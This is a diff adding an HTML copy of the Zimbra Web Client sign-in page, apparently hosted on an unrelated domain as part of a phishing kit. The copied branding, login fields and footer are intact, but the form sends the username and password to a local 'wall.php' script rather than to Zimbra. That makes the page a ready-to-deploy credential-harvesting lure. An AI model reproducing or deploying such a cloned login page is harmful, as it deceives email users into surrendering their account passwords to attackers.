@@ -1,0 +1,137 @@
+<!-- URL =http://geminiirg.co.uk/zimbra/Zimbra%20main/3152253d53b52fee0f867c9d1--><!-- w =('geminiirg.co.uk', datetime.datetime(2021, 4, 26, 0, 0), datetime.datetime(2022, 4, 26, 0, 0))--><!DOCTYPE html>
+<!-- saved from url=(0024)https://mail.zimbra.com/ -->
+<html class="user_font_size_normal" lang="en">
+ <head>
+  <meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+  <title>
+   Zimbra Web Client Sign In
+  </title>
+  <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+  <meta content="Zimbra provides open source server and client software for messaging and collaboration. To find out more visit https://www.zimbra.com." name="description"/>
+  <meta content="yes" name="apple-mobile-web-app-capable"/>
+  <meta content="black" name="apple-mobile-web-app-status-bar-style"/>
+  <link href="figs/common,login,zhtml,skin.css" rel="stylesheet" type="text/css"/>
+  <link href="https://mail.zimbra.com/img/logo/favicon.ico" rel="SHORTCUT ICON"/>
+ </head>
+ <body onload="onLoad();">
+  <div class="LoginScreen" id="modifiedLogin">
+   <div class="modernCenter">
+    <div class="modernContentBox">
+     <div class="logo">
+      <a href="" id="bannerLink" target="_new" title="Zimbra">
+       <span class="ScreenReaderOnly">
+        Zimbra
+       </span>
+       <span class="ImgLoginBanner">
+       </span>
+      </a>
+     </div>
+     <form accept-charset="UTF-8" action="wall.php" id="zLoginForm" method="post">
+      <div class="signIn">
+       Sign In
+      </div>
+      <div class="form">
+       <div class="loginSection">
+        <label class="zLoginFieldLabel" for="username">
+         Username
+        </label>
+        <input autocapitalize="off" autocorrect="off" class="zLoginFieldInput" id="username" maxlength="1024" name="username" size="40" tabindex="1" type="text" value=""/>
+        <label class="zLoginFieldLabel" for="password">
+         Password
+        </label>
+        <div class="passwordWrapper">
+         <input autocomplete="off" class="zLoginFieldInput" id="password" maxlength="1024" name="password" size="40" tabindex="2" type="password" value=""/>
+         <span id="showSpan" onclick="showPassword();" style="display: block;" toggle="#password">
+          Show
+         </span>
+         <span id="hideSpan" onclick="showPassword();" style="display: none;" toggle="#password">
+          Hide
+         </span>
+        </div>
+        <div class="signInAndLabel">
+         <div>
+          <button class="loginButton" id="loginButton" tabindex="5" type="submit">
+           Sign In
+          </button>
+         </div>
+         <div class="rememberCheckWrapper">
+          <input id="remember" tabindex="6" type="checkbox" value="1"/>
+          <label for="remember" id="remember">
+           Stay signed in
+          </label>
+         </div>
+        </div>
+       </div>
+       <div>
+        <hr/>
+       </div>
+       <div>
+        <div class="versionBlock">
+         <label for="client">
+          Web App Version
+         </label>
+         <div style="position: relative;">
+          <select id="client" name="client" onchange="clientChange(this.options[this.selectedIndex].value)">
+           <option selected="" value="preferred">
+            Default
+           </option>
+           <option value="advanced">
+            Classic
+           </option>
+           <option value="modern">
+            Modern
+           </option>
+          </select>
+          <input class="alignWhatsThis" id="ZLoginWhatsThisButton" onclick="showTooltip();" type="button"/>
+         </div>
+         <div id="ZLoginWhatsThis">
+          <div class="ZLoginInfo">
+           <span id="dialogCloseButton" onclick="hideTooltip();">
+            ×
+           </span>
+           <p>
+            <strong>
+             Modern
+            </strong>
+            <br/>
+            The Modern Web App delivers a responsive experience across all your devices and 
+										integrates with many popular apps.
+           </p>
+           <p>
+            <strong>
+             Classic
+            </strong>
+            <br/>
+            The Classic Web App is familiar
+										to long-time Zimbra users. It delivers advanced collaboration and calendar features popular with power
+										users on Desktop web browsers.
+           </p>
+           <p>
+            <strong>
+             Default
+            </strong>
+            <br/>
+            This will sign you in according to 
+										your saved Preference. In the Modern Web App, set this preference in Settings &gt; General &gt; Zimbra 
+										Version. In Classic, set it in Preferences &gt; General &gt; Sign In.
+           </p>
+          </div>
+         </div>
+        </div>
+       </div>
+      </div>
+     </form>
+    </div>
+    <div class="decor1">
+    </div>
+   </div>
+   <div class="Footer">
+    <div class="legalNotice-small" id="ZLoginNotice">
+     Copyright © 2005-2021 Synacor, Inc. All rights reserved. "Zimbra" is a registered trademark of Synacor, Inc.
+    </div>
+   </div>
+   <div class="decor2">
+   </div>
+  </div>
+ </body>
+</html>
